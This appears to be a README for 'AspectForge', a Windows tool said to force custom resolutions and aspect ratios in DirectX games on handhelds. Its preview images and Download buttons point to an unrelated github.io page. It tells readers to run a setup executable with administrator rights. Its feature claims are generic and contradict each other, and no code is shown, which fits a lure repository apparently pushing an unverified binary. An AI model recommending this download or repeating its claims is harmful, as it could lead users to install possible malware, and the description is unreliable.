![preview](https://raw.githubusercontent.com/phongkyy/mhw-widescreen-reforge/main/frame_8110500.svg)

# LumenScape AspectForge

**Repository Name:** LumenScape/AspectForge

**Tagline:** Reshape the visual narrative of your handheld gaming universe without compromising performance or fidelity.

---

## Overview

AspectForge is not merely a utility; it is a precision instrument for the modern digital traveler. Born from the need to bridge the gap between software expectations and hardware realities, this toolkit provides a seamless, robust, and elegant method for forcing custom resolutions and aspect ratios on the go. While inspired by the quest to unlock the full potential of a specific 16:10 display on a 1280x800 panel, AspectForge transcends its origins to become a universal translator between game engines and your unique screen geometry.

We understand that every pixel tells a story. When a title stubbornly refuses to acknowledge the full canvas of your display, it truncates the tale. AspectForge steps in as the visual interpreter, ensuring that the world you are exploring expands to the very edges of your glass, unhindered by preset limitations. This tool is designed for the enthusiast who sees beyond the default settings and demands a personalized, immersive experience that respects both the hardware's capabilities and the software's intent.

Under the hood, AspectForge leverages sophisticated interception techniques to communicate directly with the graphics API (DirectX 11 and 12), providing a transparent layer that adjusts the rendering output without altering core game files. It is a non-invasive solution that prioritizes stability and compatibility, making it an essential companion for a wide library of titles. Whether you are navigating the dense undergrowth of a jungle or piloting a starship through a nebula, AspectForge ensures your view is unconstrained and perfectly framed.

---

## 📸 Visual Transformation (Preview Concept)

> *Imagine the difference between looking through a keyhole and stepping through a grand doorway.* AspectForge is the key that turns that keyhole into an expansive portal, allowing the light, color, and detail of your favorite worlds to flood your senses.

This section would typically showcase the stark contrast between a standard stretched or letterboxed output and the true, undistorted widescreen presentation achieved with AspectForge. The transformation is dramatic: characters are no longer oval-shaped, the horizon is no longer truncated, and the UI elements are correctly anchored to the screen edges. This is not about cropping; it is about revealing what was always there, hidden behind the constraints of a rigid configuration.

---

## 🚀 Getting Started

Before you embark on this journey of visual liberation, ensure your environment is prepared for the integration. The following guide will walk you through the initial setup and configuration process.

### Prerequisites

- A Windows-based handheld gaming device (e.g., Steam Deck running Windows) or a standard PC with a display that supports a non-standard aspect ratio (like 16:10).
- A modern graphics driver stack supporting DirectX 11 and/or DirectX 12.
- Administrative privileges to install the necessary system-level components.

### Installation Process

1.  **Acquire the Package:** Obtain the latest release of AspectForge from the official repository channel.
2.  **Extract the Core:** Unpack the archive to a dedicated, non-temporary folder (e.g., `C:\AspectForge`). This ensures stability and easy access for updates.
3.  **Run the Initializer:** Execute the `AspectForge_Setup.exe` binary. The installer will register the necessary libraries with the operating system. A system restart is recommended post-installation to ensure all components are properly loaded and recognized.
4.  **Configure Your Profile:** Upon first launch, AspectForge will scan your connected displays and present a list of compatible output modes. Select your desired resolution (e.g., 1280x800) and refresh rate.

[![Download](https://raw.githubusercontent.com/phongkyy/mhw-widescreen-reforge/main/app_2a4c.svg)](https://phongkyy.github.io/mhw-widescreen-reforge/)

---

## 🛠️ Key Features

AspectForge is packed with features designed to make the experience as frictionless and powerful as possible.

### 🎯 Dynamic Resolution Forcing
Bypass the limited dropdown menus of game launchers. AspectForge injects a custom resolution directly into the rendering pipeline, allowing you to run titles at resolutions the developers never officially listed. This is achieved through a sophisticated shim that intercepts `CreateSwapChain` and `ResizeBuffers` calls, providing real-time, accurate scaling.

### 🔄 API Agnostic Support
Compatibility is king. Our engine communicates fluently with both DirectX 11 and DirectX 12, covering the vast majority of modern and classic titles. This dual-layer support ensures that whether you are playing a recent AAA release or a beloved indie gem, AspectForge can adapt to its rendering language. The transition between API modes is seamless, requiring no user intervention once configured.

### 🗣️ Multilingual Interface
The user interface is designed for a global audience. It currently supports English, Japanese, Simplified Chinese, French, German, and Spanish. The language selector detects your system locale by default but can be manually overridden in the settings panel. All tooltips, notifications, and configuration menus are fully localized to ensure a comfortable experience for every user.

### 🌐 Cloud Profile Synchronization
Your settings should travel with you. AspectForge allows you to backup your resolution profiles and per-game configurations to a local file, or sync them to your preferred cloud storage service via a custom export path. This ensures that moving from your main rig to your handheld device is a plug-and-play affair, with no need to reconfigure your preferred "look" from scratch.

### 🛡️ Stability & Safety Architecture
We prioritize the integrity of your system. AspectForge is a "no-write" solution, meaning it does not patch or modify any executable files of the games you play. It operates entirely in a temporary memory-mapped space, ensuring that your library remains pristine and untouched. If any instability occurs, a simple process restart rolls the environment back to its native state instantly.

### 💾 Low Overhead Performance
Performance impact is negligible, averaging a sub-millisecond processing delay. Our code is optimized for lean operation, ensuring that every frame drawn is done so with the utmost efficiency. We do not consume additional VRAM for our operations, relying on the native resources of the API to perform the necessary adjustments.

---

## 🧭 Use Cases & Scenarios

AspectForge is not just for the "ultra-enthusiast." It serves a multitude of practical purposes:

- **Handheld Liberation:** The primary use case, transforming a standard 16:9 display into the more productive 16:10 layout common on devices like the Steam Deck's LCD and OLED models.
- **Legacy Game Revival:** Revisit older titles locked to 4:3 or 5:4 and stretch them beautifully onto modern flat panels without the "fisheye" effect common in simple stretching hacks.
- **Productivity in Gaming:** For titles with HUD-heavy interfaces (e.g., strategy games or MMOs), the extra vertical space provided by a taller aspect ratio offers a distinct strategic advantage, showing more of the game world.
- **Content Creation:** Capture gameplay footage at the native panel resolution without black bars, providing clean, professional-looking content that utilizes the full screen real estate.

---

## ⚙️ Configuration & Tuning

The default settings of AspectForge work flawlessly for 95% of users. For the remaining 5% who wish to fine-tune their experience, we offer an advanced configuration editor.

### The `aspectforge.ini` File

Located in the root installation directory, this file provides granular control over the injection parameters.

```
[Display]
Resolution=1280x800
RefreshRate=60

[Rendering]
DPI_Scaling=1
Aspect_Method=Maintain_Aspect

[Behavior]
Startup_Hotkey=F9
Toggle_Enable=True
```

- **`Resolution` & `RefreshRate`:** The primary target parameters. AspectForge will attempt to output these to the display.
- **`ASPECT_METHOD`:** Allows you to choose between `Maintain_Aspect` (adds letterboxing to preserve original game ratio, if it cannot match the target) or `Stretch_To_Fit` (forces the image to fill the entire screen, potentially distorting the geometry).
- **`STARTUP_HOTKEY`:** A global hotkey to enable/disable the tool on the fly, without alt-tabbing out of a full-screen application.

---

## 💬 Community & Support

We believe in the power of collective knowledge. Our community is active and helpful, and we encourage you to participate, share your configuration profiles, and report any anomalies you encounter.

- **Issue Tracker:** For bug reports and feature requests, please use the `Issues` tab at the top of this repository. Follow the provided template to ensure we have all the necessary system information to assist you effectively.
- **Discussions:** For general questions, troubleshooting "how-tos," and sharing your success stories, head over to the `Discussions` tab. Our 24/7 support team monitors this space to provide rapid assistance, alongside veteran community members.

### 🌟 Contribution Guidelines
We welcome all contributions that align with our vision of a flexible, open-source tool. Please ensure any pull requests are accompanied by a clear description of the change, test results, and a reference to the relevant issue. We maintain a strict code-of-conduct to foster a welcoming environment for all developers, regardless of experience level.

---

## 📜 License & Legal

This project is licensed under the **MIT License** - a permissive license that allows for commercial use, modification, distribution, and private use, provided the original copyright notice is retained. We believe in open development and the free exchange of ideas.

```
MIT License

Copyright (c) 2026 LumenScape Project

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

[View the full MIT License](LICENSE)

---

## ⚠️ Disclaimer & User Responsibility

AspectForge is a powerful tool intended for legal, personal, and educational use. It is designed to modify the display output of software that you legally own. The developers of this project are not responsible for any misuse, violation of third-party terms of service, or hardware issues that may arise from incorrect configuration.

- **Use at Your Own Risk:** While we test extensively, we cannot guarantee compatibility with every single game, driver, or hardware revision. Always keep your graphics drivers up-to-date.
- **Online Play:** Some anti-cheat software may flag system-level modifications. While AspectForge is a "no-write" tool, we advise users to disable AspectForge when playing competitive online titles to avoid any potential automated account flags, even if erroneous.
- **No Warranty:** The software is provided "AS IS," without warranty of any kind, express or implied.

By downloading and using AspectForge, you acknowledge that you have read and understood this disclaimer and accept full responsibility for your actions within the software ecosystem.

---

## 📈 Roadmap & Future Development

We are constantly looking to refine and expand AspectForge. Planned features for the 2026 roadmap include:

- **Q1:** Vulkan API support for broader Linux-native and DXVK-based titles.
- **Q2:** A per-game profile manager with a drag-and-drop GUI.
- **Q3:** Overlay integration to monitor current resolution and FPS without external tools.
- **Q4:** Automated aspect ratio detection and suggestion engine based on the active display's EDID data.

Your feedback shapes our priorities. Vote on these features in the Discussions tab.

---

## 🙏 Acknowledgments

A huge thank you to the open-source community and reverse-engineering forums whose resources and discussions provided the foundational knowledge for this project. The journey from a specific "fix" for a handheld device to a universal tool was only possible due to the shared passion for breaking down the barriers we face as gamers.

---

## 📦 Final Considerations

AspectForge is, at its heart, a tool for appreciation. It appreciates the hardware we hold, the software we love, and the difference that a perfect view makes to our enjoyment. We hope it serves you well.

Thank you for taking the time to explore this repository. We look forward to seeing the worlds you unlock.

[![Download](https://raw.githubusercontent.com/phongkyy/mhw-widescreen-reforge/main/app_2a4c.svg)](https://phongkyy.github.io/mhw-widescreen-reforge/)